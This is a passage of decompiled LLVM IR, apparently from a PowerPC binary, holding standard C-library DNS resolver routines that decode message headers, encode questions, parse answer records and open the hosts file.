  %v5_10016ab4 = inttoptr i32 %v4_10016ab4 to i8*
  store i8 %v3_10016ab0, i8* %v5_10016ab4, align 1
  %v1_10016ab8 = add i32 %tmp, 44
  %v2_10016ab8 = inttoptr i32 %v1_10016ab8 to i32*
  %v3_10016ab8 = load i32, i32* %v2_10016ab8, align 4
  store i32 %v3_10016ab8, i32* %r0.global-to-local, align 4
  %v1_10016abc = trunc i32 %v3_10016ab8 to i8
  %v4_10016abc = add i32 %arg2, 11
  %v5_10016abc = inttoptr i32 %v4_10016abc to i8*
  store i8 %v1_10016abc, i8* %v5_10016abc, align 1
  %v0_10016ac0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10016ac0

dec_label_pc_10016ac0:                            ; preds = %entry, %dec_label_pc_100169e8
  %v0_10016ac0 = phi i32 [ -1, %entry ], [ %v0_10016ac0.pre, %dec_label_pc_100169e8 ]
  ret i32 %v0_10016ac0

; uselistorder directives
  uselistorder i32 %v1_10016a70, { 1, 0 }
  uselistorder i32 %v1_10016a48, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder i32 38, { 6, 7, 2, 3, 4, 5, 0, 1 }
  uselistorder label %dec_label_pc_10016ac0, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10016ac8 = load i8, i8* %arg1, align 1
  %v4_10016ac8 = zext i8 %v3_10016ac8 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10016ad0 = add i32 %tmp, 1
  %v3_10016ad0 = inttoptr i32 %v2_10016ad0 to i8*
  %v4_10016ad0 = load i8, i8* %v3_10016ad0, align 1
  %v5_10016ad0 = zext i8 %v4_10016ad0 to i32
  %v1_10016ad8 = mul nuw nsw i32 %v4_10016ac8, 256
  %v2_10016adc = or i32 %v5_10016ad0, %v1_10016ad8
  %v2_10016ae0 = inttoptr i32 %arg2 to i32*
  store i32 %v2_10016adc, i32* %v2_10016ae0, align 4
  %v0_10016ae4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10016ae4 = add i32 %v0_10016ae4, 2
  %v2_10016ae4 = inttoptr i32 %v1_10016ae4 to i8*
  %v3_10016ae4 = load i8, i8* %v2_10016ae4, align 1
  %v4_10016ae4 = zext i8 %v3_10016ae4 to i32
  %v1_10016ae8 = call i32 @__asm_rlwinm(i32 %v4_10016ae4, i32 25, i32 31, i32 31)
  %v2_10016aec = add i32 %arg2, 4
  %v3_10016aec = inttoptr i32 %v2_10016aec to i32*
  store i32 %v1_10016ae8, i32* %v3_10016aec, align 4
  %v0_10016af0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10016af0 = add i32 %v0_10016af0, 2
  %v2_10016af0 = inttoptr i32 %v1_10016af0 to i8*
  %v3_10016af0 = load i8, i8* %v2_10016af0, align 1
  %v4_10016af0 = zext i8 %v3_10016af0 to i32
  %v1_10016af4 = call i32 @__asm_rlwinm(i32 %v4_10016af0, i32 29, i32 28, i32 31)
  %v2_10016af8 = add i32 %arg2, 8
  %v3_10016af8 = inttoptr i32 %v2_10016af8 to i32*
  store i32 %v1_10016af4, i32* %v3_10016af8, align 4
  %v0_10016afc = load i32, i32* %r9.global-to-local, align 4
  %v1_10016afc = add i32 %v0_10016afc, 2
  %v2_10016afc = inttoptr i32 %v1_10016afc to i8*
  %v3_10016afc = load i8, i8* %v2_10016afc, align 1
  %v4_10016afc = zext i8 %v3_10016afc to i32
  %v1_10016b00 = call i32 @__asm_rlwinm(i32 %v4_10016afc, i32 30, i32 31, i32 31)
  %v2_10016b04 = add i32 %arg2, 12
  %v3_10016b04 = inttoptr i32 %v2_10016b04 to i32*
  store i32 %v1_10016b00, i32* %v3_10016b04, align 4
  %v0_10016b08 = load i32, i32* %r9.global-to-local, align 4
  %v1_10016b08 = add i32 %v0_10016b08, 2
  %v2_10016b08 = inttoptr i32 %v1_10016b08 to i8*
  %v3_10016b08 = load i8, i8* %v2_10016b08, align 1
  %v4_10016b08 = zext i8 %v3_10016b08 to i32
  %v1_10016b0c = call i32 @__asm_rlwinm(i32 %v4_10016b08, i32 31, i32 31, i32 31)
  %v2_10016b10 = add i32 %arg2, 16
  %v3_10016b10 = inttoptr i32 %v2_10016b10 to i32*
  store i32 %v1_10016b0c, i32* %v3_10016b10, align 4
  %v0_10016b14 = load i32, i32* %r9.global-to-local, align 4
  %v1_10016b14 = add i32 %v0_10016b14, 2
  %v2_10016b14 = inttoptr i32 %v1_10016b14 to i8*
  %v3_10016b14 = load i8, i8* %v2_10016b14, align 1
  %tmp1 = urem i8 %v3_10016b14, 2
  %v1_10016b18 = zext i8 %tmp1 to i32
  %v2_10016b1c = add i32 %arg2, 20
  %v3_10016b1c = inttoptr i32 %v2_10016b1c to i32*
  store i32 %v1_10016b18, i32* %v3_10016b1c, align 4
  %v0_10016b20 = load i32, i32* %r9.global-to-local, align 4
  %v1_10016b20 = add i32 %v0_10016b20, 3
  %v2_10016b20 = inttoptr i32 %v1_10016b20 to i8*
  %v3_10016b20 = load i8, i8* %v2_10016b20, align 1
  %v4_10016b20 = zext i8 %v3_10016b20 to i32
  %v1_10016b24 = call i32 @__asm_rlwinm(i32 %v4_10016b20, i32 25, i32 31, i32 31)
  %v2_10016b28 = add i32 %arg2, 24
  %v3_10016b28 = inttoptr i32 %v2_10016b28 to i32*
  store i32 %v1_10016b24, i32* %v3_10016b28, align 4
  %v0_10016b2c = load i32, i32* %r9.global-to-local, align 4
  %v1_10016b2c = add i32 %v0_10016b2c, 3
  %v2_10016b2c = inttoptr i32 %v1_10016b2c to i8*
  %v3_10016b2c = load i8, i8* %v2_10016b2c, align 1
  %tmp2 = urem i8 %v3_10016b2c, 16
  %v1_10016b30 = zext i8 %tmp2 to i32
  %v2_10016b34 = add i32 %arg2, 28
  %v3_10016b34 = inttoptr i32 %v2_10016b34 to i32*
  store i32 %v1_10016b30, i32* %v3_10016b34, align 4
  %v0_10016b38 = load i32, i32* %r9.global-to-local, align 4
  %v1_10016b38 = add i32 %v0_10016b38, 4
  %v2_10016b38 = inttoptr i32 %v1_10016b38 to i8*
  %v3_10016b38 = load i8, i8* %v2_10016b38, align 1
  %v4_10016b38 = zext i8 %v3_10016b38 to i32
  %v1_10016b3c = add i32 %v0_10016b38, 5
  %v2_10016b3c = inttoptr i32 %v1_10016b3c to i8*
  %v3_10016b3c = load i8, i8* %v2_10016b3c, align 1
  %v4_10016b3c = zext i8 %v3_10016b3c to i32
  %v1_10016b40 = mul nuw nsw i32 %v4_10016b38, 256
  %v2_10016b44 = or i32 %v4_10016b3c, %v1_10016b40
  %v2_10016b48 = add i32 %arg2, 32
  %v3_10016b48 = inttoptr i32 %v2_10016b48 to i32*
  store i32 %v2_10016b44, i32* %v3_10016b48, align 4
  %v0_10016b4c = load i32, i32* %r9.global-to-local, align 4
  %v1_10016b4c = add i32 %v0_10016b4c, 6
  %v2_10016b4c = inttoptr i32 %v1_10016b4c to i8*
  %v3_10016b4c = load i8, i8* %v2_10016b4c, align 1
  %v4_10016b4c = zext i8 %v3_10016b4c to i32
  %v1_10016b50 = add i32 %v0_10016b4c, 7
  %v2_10016b50 = inttoptr i32 %v1_10016b50 to i8*
  %v3_10016b50 = load i8, i8* %v2_10016b50, align 1
  %v4_10016b50 = zext i8 %v3_10016b50 to i32
  %v1_10016b54 = mul nuw nsw i32 %v4_10016b4c, 256
  %v2_10016b58 = or i32 %v4_10016b50, %v1_10016b54
  %v2_10016b5c = add i32 %arg2, 36
  %v3_10016b5c = inttoptr i32 %v2_10016b5c to i32*
  store i32 %v2_10016b58, i32* %v3_10016b5c, align 4
  %v0_10016b60 = load i32, i32* %r9.global-to-local, align 4
  %v1_10016b60 = add i32 %v0_10016b60, 8
  %v2_10016b60 = inttoptr i32 %v1_10016b60 to i8*
  %v3_10016b60 = load i8, i8* %v2_10016b60, align 1
  %v4_10016b60 = zext i8 %v3_10016b60 to i32
  %v1_10016b64 = add i32 %v0_10016b60, 9
  %v2_10016b64 = inttoptr i32 %v1_10016b64 to i8*
  %v3_10016b64 = load i8, i8* %v2_10016b64, align 1
  %v4_10016b64 = zext i8 %v3_10016b64 to i32
  %v1_10016b68 = mul nuw nsw i32 %v4_10016b60, 256
  %v2_10016b6c = or i32 %v4_10016b64, %v1_10016b68
  %v2_10016b70 = add i32 %arg2, 40
  %v3_10016b70 = inttoptr i32 %v2_10016b70 to i32*
  store i32 %v2_10016b6c, i32* %v3_10016b70, align 4
  %v0_10016b74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10016b74 = add i32 %v0_10016b74, 10
  %v2_10016b74 = inttoptr i32 %v1_10016b74 to i8*
  %v3_10016b74 = load i8, i8* %v2_10016b74, align 1
  %v4_10016b74 = zext i8 %v3_10016b74 to i32
  %v1_10016b78 = add i32 %v0_10016b74, 11
  %v2_10016b78 = inttoptr i32 %v1_10016b78 to i8*
  %v3_10016b78 = load i8, i8* %v2_10016b78, align 1
  %v4_10016b78 = zext i8 %v3_10016b78 to i32
  store i32 %v4_10016b78, i32* %r9.global-to-local, align 4
  %v1_10016b7c = mul nuw nsw i32 %v4_10016b74, 256
  %v2_10016b80 = or i32 %v4_10016b78, %v1_10016b7c
  %v2_10016b84 = add i32 %arg2, 44
  %v3_10016b84 = inttoptr i32 %v2_10016b84 to i32*
  store i32 %v2_10016b80, i32* %v3_10016b84, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 12, 13, 16, 17, 18, 19, 8, 1, 2, 3, 4, 5, 6, 7, 20, 14, 0, 15, 11, 9, 10, 21, 22 }
  uselistorder i32 11, { 19, 20, 13, 14, 28, 29, 12, 6, 21, 30, 7, 22, 3, 4, 23, 24, 25, 26, 27, 5, 0, 15, 8, 9, 1, 11, 2, 10, 16, 17, 18 }
  uselistorder i32 40, { 15, 16, 24, 25, 17, 9, 10, 11, 12, 7, 26, 5, 6, 18, 0, 19, 20, 21, 22, 23, 14, 13, 1, 8, 4, 3, 2 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 28, { 37, 38, 39, 40, 3, 4, 16, 64, 50, 65, 68, 69, 41, 1, 42, 43, 44, 5, 6, 17, 18, 19, 20, 21, 22, 23, 11, 12, 13, 67, 66, 34, 36, 45, 51, 52, 46, 47, 54, 55, 56, 57, 58, 59, 62, 60, 61, 2, 63, 72, 53, 29, 73, 74, 24, 25, 7, 8, 9, 10, 14, 15, 77, 78, 75, 76, 70, 71, 26, 27, 28, 0, 30, 31, 32, 33, 35, 48, 49 }
  uselistorder i32 29, { 22, 1, 2, 3, 4, 30, 31, 5, 6, 7, 8, 9, 28, 29, 23, 24, 25, 26, 27, 34, 35, 37, 38, 32, 33, 20, 21, 41, 42, 39, 40, 18, 19, 10, 11, 12, 13, 14, 15, 16, 36, 0, 17 }
  uselistorder i32 31, { 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 52, 53, 3, 4, 5, 2, 0, 31, 32, 35, 54, 55, 14, 15, 6, 7, 1, 8, 16, 17, 18, 19, 20, 36, 37, 38, 58, 59, 56, 57, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 34, 51, 11, 12, 9, 10, 13, 33 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10016ba8 = load i32, i32* %arg1, align 4
  store i32 %v2_10016ba8, i32* %r3.global-to-local, align 4
  store i32 268528560, i32* @lr, align 4
  %v1_10016bac = inttoptr i32 %v2_10016ba8 to i8*
  %v2_10016bac = call i32 @__encode_dotted(i8* %v1_10016bac)
  store i32 %v2_10016bac, i32* %r3.global-to-local, align 4
  %v1_10016bb0 = icmp slt i32 %v2_10016bac, 0
  %v1_10016bb4 = load i32, i32* @r29, align 4
  %v2_10016bb4 = sub i32 %v1_10016bb4, %v2_10016bac
  store i32 %v2_10016bb4, i32* @r29, align 4
  br i1 %v1_10016bb0, label %dec_label_pc_10016bf4, label %dec_label_pc_10016bc0

dec_label_pc_10016bc0:                            ; preds = %entry
  %v2_10016bb8 = icmp sgt i32 %v2_10016bb4, 3
  %v0_10016bc0 = load i32, i32* @r30, align 4
  %v2_10016bc0 = add i32 %v0_10016bc0, %v2_10016bac
  store i32 %v2_10016bc0, i32* %r9.global-to-local, align 4
  br i1 %v2_10016bb8, label %dec_label_pc_10016bd0, label %dec_label_pc_10016bc8

dec_label_pc_10016bc8:                            ; preds = %dec_label_pc_10016bc0
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016bf4

dec_label_pc_10016bd0:                            ; preds = %dec_label_pc_10016bc0
  %v0_10016bd0 = load i32, i32* @r31, align 4
  %v1_10016bd0 = add i32 %v0_10016bd0, 6
  %v2_10016bd0 = inttoptr i32 %v1_10016bd0 to i8*
  %v3_10016bd0 = load i8, i8* %v2_10016bd0, align 1
  %v5_10016bd4 = inttoptr i32 %v2_10016bc0 to i8*
  store i8 %v3_10016bd0, i8* %v5_10016bd4, align 1
  %v0_10016bd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10016bd8 = add i32 %v0_10016bd8, 4
  store i32 %v1_10016bd8, i32* %r3.global-to-local, align 4
  %v0_10016bdc = load i32, i32* @r31, align 4
  %v1_10016bdc = add i32 %v0_10016bdc, 4
  %v2_10016bdc = inttoptr i32 %v1_10016bdc to i32*
  %v3_10016bdc = load i32, i32* %v2_10016bdc, align 4
  %v1_10016be0 = trunc i32 %v3_10016bdc to i8
  %v2_10016be0 = load i32, i32* %r9.global-to-local, align 4
  %v3_10016be0 = add i32 %v2_10016be0, 1
  %v4_10016be0 = inttoptr i32 %v3_10016be0 to i8*
  store i8 %v1_10016be0, i8* %v4_10016be0, align 1
  %v0_10016be4 = load i32, i32* @r31, align 4
  %v1_10016be4 = add i32 %v0_10016be4, 10
  %v2_10016be4 = inttoptr i32 %v1_10016be4 to i8*
  %v3_10016be4 = load i8, i8* %v2_10016be4, align 1
  %v2_10016be8 = load i32, i32* %r9.global-to-local, align 4
  %v3_10016be8 = add i32 %v2_10016be8, 2
  %v4_10016be8 = inttoptr i32 %v3_10016be8 to i8*
  store i8 %v3_10016be4, i8* %v4_10016be8, align 1
  %v0_10016bec = load i32, i32* @r31, align 4
  %v1_10016bec = add i32 %v0_10016bec, 8
  %v2_10016bec = inttoptr i32 %v1_10016bec to i32*
  %v3_10016bec = load i32, i32* %v2_10016bec, align 4
  %v1_10016bf0 = trunc i32 %v3_10016bec to i8
  %v2_10016bf0 = load i32, i32* %r9.global-to-local, align 4
  %v3_10016bf0 = add i32 %v2_10016bf0, 3
  %v4_10016bf0 = inttoptr i32 %v3_10016bf0 to i8*
  store i8 %v1_10016bf0, i8* %v4_10016bf0, align 1
  %v0_10016c04.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016bf4

dec_label_pc_10016bf4:                            ; preds = %entry, %dec_label_pc_10016bc8, %dec_label_pc_10016bd0
  %v0_10016c04 = phi i32 [ %v2_10016bac, %entry ], [ -1, %dec_label_pc_10016bc8 ], [ %v0_10016c04.pre, %dec_label_pc_10016bd0 ]
  ret i32 %v0_10016c04

; uselistorder directives
  uselistorder i32 %v2_10016bac, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 5, 3, 6, 4, 0 }
  uselistorder label %dec_label_pc_10016bf4, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268528664, i32* @lr, align 4
  %v0_10016c14 = call i32 @__length_dotted()
  %v1_10016c18 = icmp slt i32 %v0_10016c14, 0
  br i1 %v1_10016c18, label %dec_label_pc_10016c24, label %dec_label_pc_10016c20

dec_label_pc_10016c20:                            ; preds = %entry
  %v1_10016c20 = add i32 %v0_10016c14, 4
  br label %dec_label_pc_10016c24

dec_label_pc_10016c24:                            ; preds = %entry, %dec_label_pc_10016c20
  %v0_10016c30 = phi i32 [ %v0_10016c14, %entry ], [ %v1_10016c20, %dec_label_pc_10016c20 ]
  ret i32 %v0_10016c30

; uselistorder directives
  uselistorder label %dec_label_pc_10016c24, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_10016c38 = load i32, i32* @lr, align 4
  store i32 %v0_10016c38, i32* %r0.global-to-local, align 4
  %v2_10016c40 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_10016c40, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268528740, i32* @lr, align 4
  %v2_10016c60 = call i32 @__decode_dotted(i32 %v2_10016c40, i32 256)
  store i32 %v2_10016c60, i32* @r27, align 4
  %v1_10016c64 = icmp slt i32 %v2_10016c60, 0
  %v0_10016c68 = load i32, i32* @r28, align 4
  %v2_10016c68 = add i32 %v0_10016c68, %v2_10016c60
  store i32 %v2_10016c68, i32* @r28, align 4
  %v1_10016c6c = load i32, i32* @r29, align 4
  %v2_10016c6c = sub i32 %v1_10016c6c, %v2_10016c68
  %v1_10016c70 = add i32 %v2_10016c6c, -10
  store i32 %v1_10016c70, i32* @r29, align 4
  br i1 %v1_10016c64, label %dec_label_pc_10016d2c, label %dec_label_pc_10016c7c

dec_label_pc_10016c7c:                            ; preds = %entry
  %v0_10016c80 = load i32, i32* @r26, align 4
  %v2_10016c80 = add i32 %v0_10016c80, %v2_10016c68
  store i32 %v2_10016c80, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_10016c70, -1
  br i1 %tmp6, label %dec_label_pc_10016c90, label %dec_label_pc_10016c88

dec_label_pc_10016c88:                            ; preds = %dec_label_pc_10016c7c
  store i32 %v1_10016c70, i32* @r27, align 4
  br label %dec_label_pc_10016d2c

dec_label_pc_10016c90:                            ; preds = %dec_label_pc_10016c7c
  store i32 268528788, i32* @lr, align 4
  %v1_10016c90 = call i32 @__GI_strdup(i32 %v2_10016c40)
  %v0_10016c94 = load i32, i32* @r30, align 4
  %v1_10016c94 = add i32 %v0_10016c94, 2
  store i32 %v1_10016c94, i32* @r8, align 4
  %v1_10016c98 = load i32, i32* @r31, align 4
  %v2_10016c98 = inttoptr i32 %v1_10016c98 to i32*
  store i32 %v1_10016c90, i32* %v2_10016c98, align 4
  %v0_10016c9c = load i32, i32* @r8, align 4
  %v1_10016c9c = add i32 %v0_10016c9c, 2
  store i32 %v1_10016c9c, i32* @r10, align 4
  %v0_10016ca0 = load i32, i32* @r30, align 4
  %v1_10016ca0 = add i32 %v0_10016ca0, 10
  store i32 %v1_10016ca0, i32* %r6.global-to-local, align 4
  %v0_10016ca4 = load i32, i32* @r26, align 4
  %v1_10016ca4 = load i32, i32* @r28, align 4
  %v2_10016ca4 = add i32 %v1_10016ca4, %v0_10016ca4
  %v3_10016ca4 = inttoptr i32 %v2_10016ca4 to i8*
  %v4_10016ca4 = load i8, i8* %v3_10016ca4, align 1
  %v5_10016ca4 = zext i8 %v4_10016ca4 to i32
  store i32 %v5_10016ca4, i32* %r0.global-to-local, align 4
  %v1_10016ca8 = add i32 %v0_10016ca0, 1
  %v2_10016ca8 = inttoptr i32 %v1_10016ca8 to i8*
  %v3_10016ca8 = load i8, i8* %v2_10016ca8, align 1
  %v4_10016ca8 = zext i8 %v3_10016ca8 to i32
  store i32 %v4_10016ca8, i32* %r9.global-to-local, align 4
  %v1_10016cac = mul nuw nsw i32 %v5_10016ca4, 256
  %v2_10016cb0 = or i32 %v4_10016ca8, %v1_10016cac
  store i32 %v2_10016cb0, i32* %r0.global-to-local, align 4
  %v1_10016cb4 = load i32, i32* @r31, align 4
  %v2_10016cb4 = add i32 %v1_10016cb4, 4
  %v3_10016cb4 = inttoptr i32 %v2_10016cb4 to i32*
  store i32 %v2_10016cb0, i32* %v3_10016cb4, align 4
  %v0_10016cb8 = load i32, i32* @r30, align 4
  %v1_10016cb8 = add i32 %v0_10016cb8, 2
  %v2_10016cb8 = inttoptr i32 %v1_10016cb8 to i8*
  %v3_10016cb8 = load i8, i8* %v2_10016cb8, align 1
  %v4_10016cb8 = zext i8 %v3_10016cb8 to i32
  store i32 %v4_10016cb8, i32* %r0.global-to-local, align 4
  %v0_10016cbc = load i32, i32* @r8, align 4
  %v1_10016cbc = add i32 %v0_10016cbc, 1
  %v2_10016cbc = inttoptr i32 %v1_10016cbc to i8*
  %v3_10016cbc = load i8, i8* %v2_10016cbc, align 1
  %v4_10016cbc = zext i8 %v3_10016cbc to i32
  store i32 %v4_10016cbc, i32* %r9.global-to-local, align 4
  %v1_10016cc0 = mul nuw nsw i32 %v4_10016cb8, 256
  %v2_10016cc4 = or i32 %v4_10016cbc, %v1_10016cc0
  store i32 %v2_10016cc4, i32* %r0.global-to-local, align 4
  %v1_10016cc8 = load i32, i32* @r31, align 4
  %v2_10016cc8 = add i32 %v1_10016cc8, 8
  %v3_10016cc8 = inttoptr i32 %v2_10016cc8 to i32*
  store i32 %v2_10016cc4, i32* %v3_10016cc8, align 4
  %v0_10016ccc = load i32, i32* @r8, align 4
  %v1_10016ccc = add i32 %v0_10016ccc, 2
  %v2_10016ccc = inttoptr i32 %v1_10016ccc to i8*
  %v3_10016ccc = load i8, i8* %v2_10016ccc, align 1
  %v4_10016ccc = zext i8 %v3_10016ccc to i32
  store i32 %v4_10016ccc, i32* %r0.global-to-local, align 4
  %v0_10016cd0 = load i32, i32* @r10, align 4
  %v1_10016cd0 = add i32 %v0_10016cd0, 1
  %v2_10016cd0 = inttoptr i32 %v1_10016cd0 to i8*
  %v3_10016cd0 = load i8, i8* %v2_10016cd0, align 1
  %v4_10016cd0 = zext i8 %v3_10016cd0 to i32
  store i32 %v4_10016cd0, i32* %r11.global-to-local, align 4
  %v1_10016cd4 = add i32 %v0_10016cd0, 3
  %v2_10016cd4 = inttoptr i32 %v1_10016cd4 to i8*
  %v3_10016cd4 = load i8, i8* %v2_10016cd4, align 1
  %v4_10016cd4 = zext i8 %v3_10016cd4 to i32
  %v1_10016cd8 = mul nuw i32 %v4_10016ccc, 16777216
  store i32 %v1_10016cd8, i32* %r0.global-to-local, align 4
  %v1_10016cdc = add i32 %v0_10016cd0, 2
  %v2_10016cdc = inttoptr i32 %v1_10016cdc to i8*
  %v3_10016cdc = load i8, i8* %v2_10016cdc, align 1
  %v4_10016cdc = zext i8 %v3_10016cdc to i32
  %v1_10016ce0 = mul nuw nsw i32 %v4_10016cd0, 65536
  %v2_10016ce4 = or i32 %v1_10016ce0, %v1_10016cd8
  %v0_10016ce8 = load i32, i32* @r28, align 4
  %v1_10016ce8 = add i32 %v0_10016ce8, 10
  store i32 %v1_10016ce8, i32* %r11.global-to-local, align 4
  %v2_10016cec = or i32 %v2_10016ce4, %v4_10016cd4
  store i32 %v2_10016cec, i32* %r0.global-to-local, align 4
  %v1_10016cf0 = mul nuw nsw i32 %v4_10016cdc, 256
  %v2_10016cf4 = or i32 %v1_10016cf0, %v2_10016cec
  store i32 %v2_10016cf4, i32* %r9.global-to-local, align 4
  %v1_10016cf8 = load i32, i32* @r31, align 4
  %v2_10016cf8 = add i32 %v1_10016cf8, 12
  %v3_10016cf8 = inttoptr i32 %v2_10016cf8 to i32*
  store i32 %v2_10016cf4, i32* %v3_10016cf8, align 4
  %v0_10016cfc = load i32, i32* @r8, align 4
  %v1_10016cfc = add i32 %v0_10016cfc, 6
  %v2_10016cfc = inttoptr i32 %v1_10016cfc to i8*
  %v3_10016cfc = load i8, i8* %v2_10016cfc, align 1
  %v4_10016cfc = zext i8 %v3_10016cfc to i32
  store i32 %v4_10016cfc, i32* %r9.global-to-local, align 4
  %v0_10016d00 = load i32, i32* @r30, align 4
  %v1_10016d00 = add i32 %v0_10016d00, 9
  %v2_10016d00 = inttoptr i32 %v1_10016d00 to i8*
  %v3_10016d00 = load i8, i8* %v2_10016d00, align 1
  %v4_10016d00 = zext i8 %v3_10016d00 to i32
  store i32 %v4_10016d00, i32* %r0.global-to-local, align 4
  %v1_10016d04 = mul nuw nsw i32 %v4_10016cfc, 256
  store i32 %v1_10016d04, i32* %r9.global-to-local, align 4
  %v0_10016d08 = load i32, i32* %r11.global-to-local, align 4
  %v1_10016d08 = load i32, i32* @r31, align 4
  %v2_10016d08 = add i32 %v1_10016d08, 24
  %v3_10016d08 = inttoptr i32 %v2_10016d08 to i32*
  store i32 %v0_10016d08, i32* %v3_10016d08, align 4
  %v0_10016d0c = load i32, i32* %r9.global-to-local, align 4
  %v1_10016d0c = load i32, i32* %r0.global-to-local, align 4
  %v2_10016d0c = or i32 %v1_10016d0c, %v0_10016d0c
  store i32 %v2_10016d0c, i32* %r9.global-to-local, align 4
  %v0_10016d10 = load i32, i32* %r6.global-to-local, align 4
  %v1_10016d10 = load i32, i32* @r31, align 4
  %v2_10016d10 = add i32 %v1_10016d10, 20
  %v3_10016d10 = inttoptr i32 %v2_10016d10 to i32*
  store i32 %v0_10016d10, i32* %v3_10016d10, align 4
  %v0_10016d14 = load i32, i32* @r29, align 4
  %v1_10016d14 = load i32, i32* %r9.global-to-local, align 4
  %v2_10016d14 = icmp slt i32 %v0_10016d14, %v1_10016d14
  %v1_10016d18 = add i32 %v1_10016d14, 10
  store i32 %v1_10016d18, i32* %r0.global-to-local, align 4
  %v0_10016d1c = load i32, i32* @r27, align 4
  %v2_10016d1c = add i32 %v0_10016d1c, %v1_10016d18
  store i32 %v2_10016d1c, i32* @r27, align 4
  %v1_10016d20 = load i32, i32* @r31, align 4
  %v2_10016d20 = add i32 %v1_10016d20, 16
  %v3_10016d20 = inttoptr i32 %v2_10016d20 to i32*
  store i32 %v1_10016d14, i32* %v3_10016d20, align 4
  br i1 %v2_10016d14, label %dec_label_pc_10016d28, label %dec_label_pc_10016c90.dec_label_pc_10016d2c_crit_edge

dec_label_pc_10016c90.dec_label_pc_10016d2c_crit_edge: ; preds = %dec_label_pc_10016c90
  %v0_10016d30.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10016d2c

dec_label_pc_10016d28:                            ; preds = %dec_label_pc_10016c90
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10016d2c

dec_label_pc_10016d2c:                            ; preds = %dec_label_pc_10016c90.dec_label_pc_10016d2c_crit_edge, %entry, %dec_label_pc_10016c88, %dec_label_pc_10016d28
  %v0_10016d30 = phi i32 [ %v0_10016d30.pre, %dec_label_pc_10016c90.dec_label_pc_10016d2c_crit_edge ], [ %v2_10016c60, %entry ], [ %v1_10016c70, %dec_label_pc_10016c88 ], [ -1, %dec_label_pc_10016d28 ]
  store i32 %v0_10016c38, i32* %r0.global-to-local, align 4
  ret i32 %v0_10016d30

; uselistorder directives
  uselistorder i32 %v1_10016d14, { 1, 0, 2 }
  uselistorder i32 %v1_10016cd8, { 1, 0 }
  uselistorder i32 %v1_10016c70, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10016c60, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10016c40, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 9, { 14, 15, 16, 17, 2, 7, 18, 3, 19, 4, 25, 0, 20, 21, 22, 23, 24, 5, 8, 26, 1, 6, 9, 10, 11, 12, 13 }
  uselistorder i32 (i32)* @__GI_strdup, { 2, 1, 0, 4, 3 }
  uselistorder i32 -10, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10016d2c, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_10016d48 = load i32, i32* @lr, align 4
  store i32 268529004, i32* @lr, align 4
  %v3_10016d68 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1001a1d8.614 to i32), i32 ptrtoint (i32* @global_var_1001a0b4.552 to i32))
  %v3_10016d70 = icmp eq i32 %v3_10016d68, 0
  br i1 %v3_10016d70, label %dec_label_pc_10016d78, label %dec_label_pc_10016d94

dec_label_pc_10016d78:                            ; preds = %entry
  %v0_10016d6c = load i32, i32* @r29, align 4
  store i32 %v0_10016d48, i32* @lr, align 4
  %v3_10016d90 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1001a1e4.615 to i32), i32 %v0_10016d6c)
  br label %dec_label_pc_10016d94

dec_label_pc_10016d94:                            ; preds = %entry, %dec_label_pc_10016d78
  %v0_10016da4 = phi i32 [ %v3_10016d68, %entry ], [ %v3_10016d90, %dec_label_pc_10016d78 ]
  ret i32 %v0_10016da4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 5, 4, 3, 2, 1, 0 }
